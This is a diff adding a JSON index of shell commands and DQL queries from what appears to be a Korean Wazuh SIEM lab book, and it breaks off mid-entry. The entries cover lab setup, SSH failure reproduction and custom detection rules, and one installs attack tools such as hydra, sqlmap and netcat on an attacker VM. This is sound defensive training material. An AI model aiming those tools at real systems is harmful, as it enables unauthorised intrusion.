@@ -1,0 +1,3562 @@
+[
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.3  공격자 VM 설치",
+    "id": "CA-01",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/appendix-a/CA-01.txt",
+    "text": "cat /etc/os-release\nip -4 -br address"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.4  설치가 멈췄을 때",
+    "id": "CA-02",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/appendix-a/CA-02.txt",
+    "text": "getent hosts github.com\ncurl -I --max-time 15 https://github.com"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.4  설치가 멈췄을 때",
+    "id": "CA-03",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/appendix-a/CA-03.txt",
+    "text": "id -nG"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.4  설치가 멈췄을 때",
+    "id": "CA-04",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/appendix-a/CA-04.txt",
+    "text": "sudo usermod -aG docker \"$USER\""
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.5  화면이 열리지 않을 때",
+    "id": "CA-05",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/appendix-a/CA-05.txt",
+    "text": "docker compose logs --tail 50 wazuh-dashboard\ndocker compose logs --tail 50 wazuh-indexer"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.6  수집기가 연결되지 않을 때",
+    "id": "CA-06",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/appendix-a/CA-06.txt",
+    "text": "sudo systemctl status wazuh-agent --no-pager\nsudo journalctl -u wazuh-agent -n 50 --no-pager"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.6  수집기가 연결되지 않을 때",
+    "id": "CA-07",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/appendix-a/CA-07.txt",
+    "text": "docker compose logs --tail 50 siem"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.6  수집기가 연결되지 않을 때",
+    "id": "CA-08",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/appendix-a/CA-08.txt",
+    "text": "sudo ./deployment/host-sensors.sh"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.12  VM과 Ubuntu 준비",
+    "id": "C01-01",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-01.txt",
+    "text": "cat /etc/os-release\nuname -m"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.12  VM과 Ubuntu 준비",
+    "id": "C01-02",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-02.txt",
+    "text": "free -h\ndf -h /"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.12  VM과 Ubuntu 준비",
+    "id": "C01-03",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-03.txt",
+    "text": "ip -4 -br address\nip route"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.12  VM과 Ubuntu 준비",
+    "id": "C01-04",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-04.txt",
+    "text": "dpkg -s git curl openssl jq nano python3 \\\n  python3-yaml gnupg ca-certificates openssh-client"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.12  VM과 Ubuntu 준비",
+    "id": "C01-05",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-05.txt",
+    "text": "sudo apt-get update"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.12  VM과 Ubuntu 준비",
+    "id": "C01-06",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-06.txt",
+    "text": "sudo apt-get install git curl ca-certificates openssl jq \\\n  nano python3 python3-yaml gnupg openssh-client"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.13  kt66 코드와 환경 설정",
+    "id": "C01-07",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-07.txt",
+    "text": "cd ~\nls -ld kt66\ngit clone https://github.com/mrgrit/kt66.git\ncd kt66\npwd"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.13  kt66 코드와 환경 설정",
+    "id": "C01-08",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-08.txt",
+    "text": "git status --short\ngit checkout --detach 63d4180\ngit rev-parse --short=7 HEAD"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.13  kt66 코드와 환경 설정",
+    "id": "C01-09",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-09.txt",
+    "text": "ls -l .env.example .env\ncp .env.example .env\nchmod 600 .env\nls -l .env"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.13  kt66 코드와 환경 설정",
+    "id": "C01-10",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-10.txt",
+    "text": "openssl rand -hex 32"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.13  kt66 코드와 환경 설정",
+    "id": "C01-11",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-11.txt",
+    "text": "nano .env"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.13  kt66 코드와 환경 설정",
+    "id": "C01-12",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-12.txt",
+    "text": "grep -E '^(SSH_USER|TZ)=' .env"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-13",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-13.txt",
+    "text": "sysctl vm.max_map_count"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-14",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-14.txt",
+    "text": "ls -l /etc/sysctl.d/99-wazuh-book.conf\nsudo nano /etc/sysctl.d/99-wazuh-book.conf"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-15",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-15.txt",
+    "text": "cat /etc/sysctl.d/99-wazuh-book.conf\nsudo sysctl -p /etc/sysctl.d/99-wazuh-book.conf\nsysctl vm.max_map_count"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-16",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-16.txt",
+    "text": "ls -l /etc/docker/daemon.json\nsudo cat /etc/docker/daemon.json"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-17",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-17.txt",
+    "text": "./kt66.sh install"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-18",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-18.txt",
+    "text": "sudo cat /etc/docker/daemon.json\ndocker --version\ndocker compose version\ndocker ps"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.14  Docker와 메모리 매핑 설정",
+    "id": "C01-19",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-19.txt",
+    "text": "grep -E \\\n'^(WEB_HOST_IP|INT_HOST_IP|LAB_DOMAIN|WINDOWS_ENABLED)=' \\\n  .env"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.15  공격자 VM 도구 설치",
+    "id": "C01-24",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-24.txt",
+    "text": "sudo apt update && sudo apt install -y \\\n  nmap hydra sqlmap nikto dirb gobuster curl \\\n  netcat-openbsd python3 python3-requests sshpass"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.15  공격자 VM 도구 설치",
+    "id": "C01-25",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-25.txt",
+    "text": "dpkg -s nmap hydra sqlmap nikto dirb gobuster curl \\\n  netcat-openbsd python3 python3-requests sshpass"
+  },
+  {
+    "document": "volume01-appendix-a.json",
+    "section": "A.15  공격자 VM 도구 설치",
+    "id": "C01-26",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-26.txt",
+    "text": "curl -I --max-time 15 http://192.168.0.107/"
+  },
+  {
+    "document": "volume01-chapter01.json",
+    "section": "1.6  kt66 기동과 접속",
+    "id": "C01-20",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-20.txt",
+    "text": "./kt66.sh up"
+  },
+  {
+    "document": "volume01-chapter01.json",
+    "section": "1.6  kt66 기동과 접속",
+    "id": "C01-21",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-21.txt",
+    "text": "docker compose ps -a"
+  },
+  {
+    "document": "volume01-chapter01.json",
+    "section": "1.7  수집기 연결 확인",
+    "id": "C01-22",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter01/C01-22.txt",
+    "text": "systemctl is-active wazuh-agent\nsystemctl is-active osqueryd"
+  },
+  {
+    "document": "volume01-chapter01.json",
+    "section": "1.8  초기 상태 보존",
+    "id": "C01-23",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter01/C01-23.txt",
+    "text": "docker compose ps -a\n./kt66.sh down\ndocker compose ps -a"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-P1",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-P1.txt",
+    "text": "docker exec -it kt66-bastion /bin/bash"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-P2",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter02/C02-P2.txt",
+    "text": "getent passwd book02_probe"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-P3",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter02/C02-P3.txt",
+    "text": "sshd -T | grep '^hostkey '\nssh-keygen -lf \\\n  /var/lib/bastion/ssh-host-keys/ssh_host_ed25519_key.pub"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-P4",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter02/C02-P4.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-P5",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-P5.txt",
+    "text": "ssh-keygen -F 10.20.30.201"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-01",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-01.txt",
+    "text": "ssh -o HostKeyAlgorithms=ssh-ed25519 \\\n  book02_probe@10.20.30.201"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-02",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-02.txt",
+    "text": "docker exec -it kt66-bastion /bin/bash"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-03",
+    "where": "kt66-bastion 컨테이너 · 셸",
+    "file": "examples/rev02/chapter02/C02-03.txt",
+    "text": "grep \"book02_probe\" /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-04",
+    "where": "kt66-bastion 컨테이너 · 셸",
+    "file": "examples/rev02/chapter02/C02-04.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.2  SSH 인증 실패 재현",
+    "id": "C02-05",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-05.txt",
+    "text": "ssh-keygen -F 10.20.30.201\nssh-keygen -R 10.20.30.201\nssh-keygen -F 10.20.30.201"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.4  시각과 시간대 확인",
+    "id": "C02-06",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-06.txt",
+    "text": "timedatectl"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.4  시각과 시간대 확인",
+    "id": "C02-07",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-07.txt",
+    "text": "date -Is\ndate -u -Is"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.5  시도와 결과 구분",
+    "id": "C02-08",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-08.txt",
+    "text": "curl -I --max-time 15 http://192.168.0.107/"
+  },
+  {
+    "document": "volume01-chapter02.json",
+    "section": "2.5  시도와 결과 구분",
+    "id": "C02-09",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter02/C02-09.txt",
+    "text": "curl -I --max-time 15 http://192.168.0.107/book02-none"
+  },
+  {
+    "document": "volume01-chapter03.json",
+    "section": "3.4  DQL 검색 조건",
+    "id": "Q03-01",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter03/Q03-01.txt",
+    "text": "agent.name: \"kt66-host\""
+  },
+  {
+    "document": "volume01-chapter03.json",
+    "section": "3.6  필드 조건을 이용한 검색",
+    "id": "Q03-02",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter03/Q03-02.txt",
+    "text": "agent.name: \"bastion\" AND rule.id: \"5710\""
+  },
+  {
+    "document": "volume01-chapter03.json",
+    "section": "3.6  필드 조건을 이용한 검색",
+    "id": "Q03-03",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter03/Q03-03.txt",
+    "text": "agent.name: \"bastion\" AND rule.id: \"5710\"\nAND data.srcip: \"10.20.30.254\""
+  },
+  {
+    "document": "volume01-chapter03.json",
+    "section": "3.7  실습에서 생성한 로그 검색",
+    "id": "Q03-04",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter03/Q03-04.txt",
+    "text": "data.srcuser: \"book02_probe\""
+  },
+  {
+    "document": "volume01-chapter03.json",
+    "section": "3.7  실습에서 생성한 로그 검색",
+    "id": "Q03-05",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter03/Q03-05.txt",
+    "text": "agent.name: \"bastion\" AND full_log: \"book02_probe\""
+  },
+  {
+    "document": "volume01-chapter03.json",
+    "section": "3.7  실습에서 생성한 로그 검색",
+    "id": "Q03-06",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter03/Q03-06.txt",
+    "text": "agent.name: \"bastion\" AND\ndata.srcip: \"10.20.30.254\" AND\n(rule.id: \"5710\" OR rule.id: \"5760\" OR rule.id: \"5715\")"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.2  수집 파일 확인",
+    "id": "C04-01",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-01.txt",
+    "text": "docker exec -it kt66-bastion /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.2  수집 파일 확인",
+    "id": "C04-02",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-02.txt",
+    "text": "hostname"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.2  수집 파일 확인",
+    "id": "C04-03",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-03.txt",
+    "text": "grep -F -B 1 -A 1 '/var/log/auth.log' \\\n  /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.3  확인 문구 기록",
+    "id": "C04-04",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-04.txt",
+    "text": "grep -F 'book04: book04-collection-01' \\\n  /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.3  확인 문구 기록",
+    "id": "C04-05",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-05.txt",
+    "text": "logger -p authpriv.notice -t book04 \\\n  'book04-collection-01'"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "기록 결과 확인",
+    "id": "C04-06",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-06.txt",
+    "text": "grep -F 'book04: book04-collection-01' \\\n  /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "기록 결과 확인",
+    "id": "C04-07",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-07.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.4  아카이브 검색",
+    "id": "Q04-01",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter04/Q04-01.txt",
+    "text": "agent.name: \"bastion\"\nAND predecoder.program_name: \"book04\""
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "디코더 정의 직접 확인",
+    "id": "C04-08",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-08.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "디코더 정의 직접 확인",
+    "id": "C04-09",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-09.txt",
+    "text": "cd /var/ossec/ruleset/decoders"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "디코더 정의 직접 확인",
+    "id": "C04-10",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-10.txt",
+    "text": "grep -n -A 2 '<decoder name=\"sshd\">' \\\n  0310-ssh_decoders.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "디코더 정의 직접 확인",
+    "id": "C04-11",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-11.txt",
+    "text": "grep -n -A 5 '<decoder name=\"ssh-invfailed\">' \\\n  0310-ssh_decoders.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "추출 결과와 경보 대조",
+    "id": "C04-12",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-12.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "규칙 파일 확인",
+    "id": "C04-13",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-13.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "규칙 파일 확인",
+    "id": "C04-14",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-14.txt",
+    "text": "cd /var/ossec/ruleset/rules"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "규칙 파일 확인",
+    "id": "C04-15",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-15.txt",
+    "text": "grep -n -A 3 '<rule id=\"5700\"' \\\n  0095-sshd_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "규칙 파일 확인",
+    "id": "C04-16",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-16.txt",
+    "text": "grep -n -A 3 '<rule id=\"5710\"' \\\n  0095-sshd_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "규칙 파일 확인",
+    "id": "C04-17",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-17.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.7  확인 문구용 규칙 준비",
+    "id": "C04-18",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-18.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.7  확인 문구용 규칙 준비",
+    "id": "C04-19",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-19.txt",
+    "text": "ls -l /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.7  확인 문구용 규칙 준비",
+    "id": "C04-20",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-20.txt",
+    "text": "grep -R -n '100410' /var/ossec/etc/rules \\\n  /var/ossec/ruleset/rules"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "규칙 파일 작성",
+    "id": "C04-21",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-21.txt",
+    "text": "nano /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "저장 내용과 권한 확인",
+    "id": "C04-22",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-22.txt",
+    "text": "cat /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "저장 내용과 권한 확인",
+    "id": "C04-23",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-23.txt",
+    "text": "chown root:wazuh \\\n  /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "저장 내용과 권한 확인",
+    "id": "C04-24",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-24.txt",
+    "text": "chmod 640 /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "저장 내용과 권한 확인",
+    "id": "C04-25",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-25.txt",
+    "text": "ls -l /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.8  규칙 검사",
+    "id": "C04-26",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-26.txt",
+    "text": "/var/ossec/bin/wazuh-analysisd -t"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.8  규칙 검사",
+    "id": "C04-27",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-27.txt",
+    "text": "echo $?"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.9  규칙 적용과 확인 로그 생성",
+    "id": "C04-28",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-28.txt",
+    "text": "/var/ossec/bin/wazuh-control restart"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.9  규칙 적용과 확인 로그 생성",
+    "id": "C04-29",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-29.txt",
+    "text": "/var/ossec/bin/wazuh-control status"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.9  규칙 적용과 확인 로그 생성",
+    "id": "C04-30",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-30.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "새 경보 확인",
+    "id": "C04-31",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-31.txt",
+    "text": "docker exec -it kt66-bastion /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "새 경보 확인",
+    "id": "C04-32",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-32.txt",
+    "text": "logger -p authpriv.notice -t book04 \\\n  'book04-collection-01'"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "새 경보 확인",
+    "id": "C04-33",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-33.txt",
+    "text": "grep -F 'book04: book04-collection-01' \\\n  /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "새 경보 확인",
+    "id": "C04-34",
+    "where": "kt66-bastion 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-34.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "새 경보 확인",
+    "id": "Q04-02",
+    "where": "Windows · Discover 검색창",
+    "file": "examples/rev02/chapter04/Q04-02.txt",
+    "text": "agent.name: \"bastion\" AND rule.id: \"100410\""
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.10  실습 규칙 원상복구",
+    "id": "C04-35",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-35.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.10  실습 규칙 원상복구",
+    "id": "C04-36",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-36.txt",
+    "text": "cat /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.10  실습 규칙 원상복구",
+    "id": "C04-37",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-37.txt",
+    "text": "rm /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "4.10  실습 규칙 원상복구",
+    "id": "C04-38",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-38.txt",
+    "text": "ls -l /var/ossec/etc/rules/book04_rules.xml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "원상복구 후 실행 확인",
+    "id": "C04-39",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-39.txt",
+    "text": "/var/ossec/bin/wazuh-analysisd -t"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "원상복구 후 실행 확인",
+    "id": "C04-40",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-40.txt",
+    "text": "echo $?"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "원상복구 후 실행 확인",
+    "id": "C04-41",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-41.txt",
+    "text": "/var/ossec/bin/wazuh-control restart"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "원상복구 후 실행 확인",
+    "id": "C04-42",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-42.txt",
+    "text": "/var/ossec/bin/wazuh-control status"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "원상복구 후 실행 확인",
+    "id": "C04-43",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-43.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "아카이브 설정 확인",
+    "id": "C04-44",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter04/C04-44.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "아카이브 설정 확인",
+    "id": "C04-45",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-45.txt",
+    "text": "grep -E 'logall_json|log_alert_level' \\\n  /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "아카이브 설정 확인",
+    "id": "C04-46",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-46.txt",
+    "text": "grep -A 2 'archives:' /etc/filebeat/filebeat.yml"
+  },
+  {
+    "document": "volume01-chapter04.json",
+    "section": "아카이브 설정 확인",
+    "id": "C04-47",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter04/C04-47.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "5.2  브라우저 접속 준비",
+    "id": "C05-01",
+    "where": "kt66 VM · ~/kt66",
+    "file": "examples/rev02/chapter05/C05-01.txt",
+    "text": "grep -E '^(WEB_HOST_IP|LAB_DOMAIN)=' .env"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "정상 요청의 아카이브 기록",
+    "id": "Q05-01",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter05/Q05-01.txt",
+    "text": "agent.name: \"web\"\nAND data.url: \"/vulnerabilities/sqli/?id=1&Submit=Submit\""
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Apache 원본 로그 확인",
+    "id": "C05-02",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-02.txt",
